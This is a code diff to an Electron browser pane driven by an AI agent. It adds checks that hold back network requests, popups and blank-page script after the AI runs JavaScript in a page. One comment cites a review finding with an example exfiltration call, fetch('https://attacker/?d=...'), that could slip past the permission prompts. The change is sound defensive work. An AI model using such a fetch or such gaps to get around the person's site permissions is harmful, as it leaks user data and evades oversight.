@@ -23,6 +23,7 @@ import { MOD_BITS, parseKeyCombo, redactUrl, ToolError } from '../../common/inpu
 import { siteKey, SitePermissions, type PermissionDecision, type SiteScope } from '../../common/site-permissions'
 import { BROWSER_TOOLS, IN_APP_BROWSER_UA_MARK } from '@mycel/shared'
 import { blockedMessage, blockedUrl, type BlockReason } from '../../common/browser-block'
+import { isBlankPage, RUNS_AI_SCRIPT } from '../../common/net-policy'
 import { HostClassifier } from './classify'
 import { installNetGuard, stopIfRebound } from './net-guard'
 import { debug } from '../debug'
@@ -79,6 +80,8 @@ interface Tab {
   /** a page-opened popup window, not a pane tab */
   popup?: BrowserWindow
   forceLeave?: boolean
+  /** the AI ran javascript_tool in the current document: its requests to other sites are held back (net-guard.ts) */
+  scripted?: boolean
 }
 /** The call being run (for prompts raised by the net guard during it). */
 interface CallCtx {
@@ -282,7 +285,8 @@ export class BrowserPane {
 
   // ------------------------------------------------------------------ tabs
 
-  private async createTab(url?: string, foreground = true): Promise<Tab> {
+  /** `fromScript`: opened by a document the AI ran script in; its first page load counts as the AI's (net-guard.ts). */
+  private async createTab(url?: string, foreground = true, fromScript = false): Promise<Tab> {
     if (this.tabs.size >= MAX_TABS) throw new ToolError(`The browser pane already has ${this.tabs.size} tabs. Close some with tabs_close first.`)
     const view = new WebContentsView({
       webPreferences: { session: this.session, sandbox: true, contextIsolation: true, nodeIntegration: false, webSecurity: true, safeDialogs: true },
@@ -295,6 +299,8 @@ export class BrowserPane {
     await this.instrument(tab)
     if (foreground || !this.activeId) this.activeId = tab.id
     this.layout()
+    // cleared again when the page commits (did-navigate)
+    if (fromScript) tab.scripted = true
     if (url) await this.load(tab, url)
     this.emit()
     return tab
@@ -308,6 +314,8 @@ export class BrowserPane {
     wc.on('did-stop-loading', refresh)
     wc.on('page-title-updated', refresh)
     wc.on('did-navigate', (_e, url) => {
+      // a new document: the AI's script (and its timers) did not survive the navigation
+      tab.scripted = false
       const host = siteKey(url)
       if (host !== tab.host) tab.network.clear()
       tab.host = host
@@ -325,8 +333,11 @@ export class BrowserPane {
     })
     wc.setWindowOpenHandler(({ url, disposition }) => {
       if (!/^(https?:|about:blank)/i.test(url) || this.tabs.size >= MAX_TABS) return { action: 'deny' }
-      // window.open with features = a popup (often a sign-in window): a real window the person handles
+      // window.open with features = a popup (often a sign-in window): a real window the person handles. Not from a
+      // document the AI ran script in: the script would hold a reference to a window outside the checks of
+      // net-guard.ts (security r3)
       if (disposition === 'new-window') {
+        if (tab.scripted) return { action: 'deny' }
         return {
           action: 'allow',
           overrideBrowserWindowOptions: {
@@ -337,7 +348,7 @@ export class BrowserPane {
           },
         }
       }
-      this.createTab(url, disposition === 'foreground-tab').catch((e) => debug('page-opened tab failed', String((e as Error).message ?? e)))
+      this.createTab(url, disposition === 'foreground-tab', tab.scripted).catch((e) => debug('page-opened tab failed', String((e as Error).message ?? e)))
       return { action: 'deny' }
     })
     wc.on('did-create-window', (child) => {
@@ -571,6 +582,26 @@ export class BrowserPane {
     return this.driving > 0
   }
 
+  /** Some tab holds a document the AI ran javascript_tool in (common/net-policy.ts). */
+  get anyScripted(): boolean {
+    for (const t of this.tabs.values()) if (t.scripted && !t.wc.isDestroyed()) return true
+    return false
+  }
+
+  /**
+   * Requests of this tab count as the AI's script: the AI ran javascript_tool in its document, or in a tab on the
+   * same site (same-origin script can reach it), or the tab is blank (inherits the origin of whoever opened it).
+   */
+  scriptedFor(tab: Tab, topUrl: string): boolean {
+    if (tab.scripted) return true
+    const site = siteKey(topUrl)
+    for (const t of this.tabs.values()) {
+      if (!t.scripted || t.wc.isDestroyed()) continue
+      if (isBlankPage(topUrl) || siteKey(t.wc.getURL()) === site) return true
+    }
+    return false
+  }
+
   /** Record a decision for both the site and (when private) the office-network scope. */
   grant(scopes: SiteScope[], host: string, d: PermissionDecision, turnId?: string) {
     let changed = false
@@ -606,8 +637,13 @@ export class BrowserPane {
   /** May the AI act on / open `url` in this call? Asks the person when not allowed yet. */
   private async permit(ctx: CallCtx, url: string, tool: string): Promise<void> {
     const scheme = url.split(':')[0].toLowerCase()
-    // the tab's own blank page; data: pages are never opened for the AI (they would need no site permission)
-    if (url === '' || url === 'about:blank') return
+    // the tab's own blank page; data: pages are never opened for the AI (they would need no site permission).
+    // The AI's own script never runs on a blank page: there is no site the person could allow or refuse, and the
+    // script could still reach any server (security r3: blank tab + fetch('https://attacker/?d=...') with no prompt).
+    if (isBlankPage(url)) {
+      if (RUNS_AI_SCRIPT.has(tool)) throw new ToolError(`${tool} needs a web page: open one with navigate first (the user will be asked about that site).`)
+      return
+    }
     if (scheme !== 'http' && scheme !== 'https') throw new ToolError(`Only http(s) pages can be opened in the browser pane (${redactUrl(url).slice(0, 200)}).`)
     const blocked = await this.forbidden(url)
     if (blocked) throw new ToolError(blockedMessage(blocked.reason, blocked.host))
@@ -860,6 +896,8 @@ export class BrowserPane {
         const t = need()
         // shown every time, also on always-allowed sites (design tab 5)
         this.activity('script', t.host)
+        // from now on this document's requests to sites the person has not allowed are held back (net-guard.ts)
+        t.scripted = true
         // replMode = DevTools console semantics: top-level await, last expression value
         const r: any = await this.cdp(t, 'Runtime.evaluate', { expression: call.input.text, replMode: true, awaitPromise: true, returnByValue: true, userGesture: true, timeout: 30_000 })
         if (r.exceptionDetails) return err(`Uncaught ${r.exceptionDetails.exception?.description ?? r.exceptionDetails.text}`)
